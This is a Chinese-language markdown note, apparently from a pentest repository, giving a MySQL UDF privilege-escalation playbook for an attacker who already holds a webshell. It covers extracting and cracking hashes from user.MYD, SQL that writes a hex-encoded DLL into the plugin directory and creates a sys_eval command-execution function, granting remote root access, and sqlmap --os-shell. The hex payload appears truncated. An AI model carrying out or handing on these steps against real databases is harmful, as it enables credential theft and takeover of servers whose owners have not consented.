# 数据库 udf提权
## 获取数据库密码方式
我们在拿到webshell的情况下，针对mysql数据库，我们可以找寻mysql的安装目录，下面的`user.MYD`文件，用记事本打开。可以找到数据库的密码，通过cmd5进行界面。如`MySQL5.7.26/data/mysql/user.MYD`

![image](https://user-images.githubusercontent.com/71583369/146636472-29f7e7a6-7186-4c08-aad5-29c7718c9baa.png)

- 文件中的密码为MD5加密，可通过解密平台解密
![image](https://user-images.githubusercontent.com/71583369/146636526-3b2e303a-a85b-40a8-a082-e41bf6bf0ffb.png)

有时密码的字符串是分开，需要进行前后拼接，才能成功解密。当密码复杂度高时解不开密码，只能通过数据库配置文件来解。
- 通过直接在数据库中查询来过去密码

## udf提权操作
```
create table temp(data longblob);
insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);
update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);
select data from temp into dumpfile "G://phpstudy_pro//Extensions//MySQL5.7.26//lib//plugin//udf.dll";(此文件路径需根据具体情况进行修改)
create function sys_eval returns string soname 'udf.dll';
```
## 当以上的方法无法成功时，可以开启mysql的外连功能
```
GRANT ALL PRIVILEGES ON *.* TO ‘root’@'%’ IDENTIFIED BY ‘rootpassword’ WITH GRANT OPTION;
```
随后通过sqlmap进行提权，命令如下：
```
sqlmap.py -d mysql://root:root@x.x.x.x:3306/mysql --os-shell
```
有时sqlmap使用时会报错，提示缺少模块，需要安装pymysql
`python pip install pymysql`
参考链接：
- https://blog.csdn.net/qq_42636435/article/details/106852716
- https://blog.csdn.net/weixin_30569033/article/details/97225345
